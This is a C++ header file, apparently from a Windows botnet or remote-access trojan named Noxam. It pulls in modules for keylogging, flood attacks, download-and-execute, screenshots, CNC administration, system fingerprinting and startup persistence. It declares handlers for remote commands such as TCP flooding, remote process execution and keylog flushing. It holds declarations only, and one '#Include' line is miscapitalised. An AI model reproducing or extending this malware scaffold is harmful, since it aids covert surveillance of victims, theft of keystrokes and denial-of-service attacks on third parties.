#ifndef NOXAM_NOXAMMAIN_HXX
#define NOXAM_NOXAMMAIN_HXX

#include <string>
#include <stdio.h>
#include <VersionHelpers.h>
#include <windows.h>
#Include <WinBase.h>

#include "Net/NoxamHTTP.hxx"
#include "NoxamAgressiveOptimize.hxx"
#include "Utils/NoxamGate.hxx"
#include "Net/NoxamNetINIT.hxx"
#include "Crypto/NoxamWebSafeEncryption.hxx"
#include "Crypto/NoxamStringOprations.hxx"
#include "Crypto/NoxamURLEncoding.hxx"
#include "Config/NoxamCommand.hxx"
#include "SystemX/NoxamWebSiteChecker.hxx"
#include "SystemX/NoxamOSVersionChecker.hxx"
#include "SystemX/NoxamOSHWidChecker.hxx"
#include "SystemX/NoxamOSCPUChecker.hxx"
#include "SystemX/NoxamOSGPUChecker.hxx"
#include "SystemX/NoxamOSNetVersionChecker.hxx"
#include "CNC/NoxamPELSAdmin.hxx"
#include "SystemX/NoxamOSGetRAM.hxx"
#include "Utils/NoxamGateHelper.hxx"
#include "Utils/NoxamKeyLogger.hxx"
#include "Attack/NoxamAttackFlood.hxx"
#include "Utils/NoxamProccess.hxx"
#include "Utils/NoxamDownloadExecute.hxx"
#include "Utils/NoxamScreenshot.hxx"
#include "NoxamStartUp.hxx"

bool NoxamContinuePooling = true;
static NoxamCommandParserDelegate Parsers[500];
static NoxamPostPollDelegate Events[500];
int NoxamEventCount = 0;


void NoxamRunEvents();
int NoxamGetEventsIndex(NoxamPostPollDelegate Nproc);
bool NoxamAddEvent(NoxamPostPollDelegate Nproc);
bool NoxamRemoveEvent(NoxamPostPollDelegate Nproc);
void NoxamKeyLogFlushEvent();
void NoxamKeyLogParser(int NxmCommand, int NxmCommandType, char* NxmData);
void NoxamRemoteProccessParser(int NxmCommandID, int NxmCommandType, char* NxmData);

DWORD __stdcall NoxamTCPThreadStart(PVOID NxmData);

void NoxamTCOFloodParser(int NxmCommandID, int NxmCommandType, char* NxmData);
void NoxamRemoteProccessNoResultParser(int NxmCommandID, int NxmCommandType, char* NxmData);
void NoxamJoinParser(int NxmCommandID, int NxmCommandType, char* NxmData);
void NoxamPollParser(int NxmCommandID, int NxmCommandType, char* NxmData);
void NoxamSiteCheckerParser(int NxmCommandID, int NxmCommandType, char* NxmData);
void NoxamDownloadAndUpdate(int NxmCommandID, int NxmCommandType, char* NxmData);
void NoxamDownloadExecuParser(int NxmCommandID, int NxmCommandType, char* NxmData);
void NoxamMessageBoxParser(int NxmCommandID, int NxmCommandType, char* NxmData);
void NoxamScreenShotParser(int NxmCommandID, int NxmCommandType, char* NxmData);
void NoxamInitializeParser();
char* NoxamGetInitializeJoinCommand();
void NoxamInitializePollThread();
int WINAPI NoxamWinMain(HINSTANCE NxmIn, HINSTANCE NxmPrev, LPSTR NxmCmd, int NxmShow);

#endif NOXAM_NOXAMMAIN_HXX
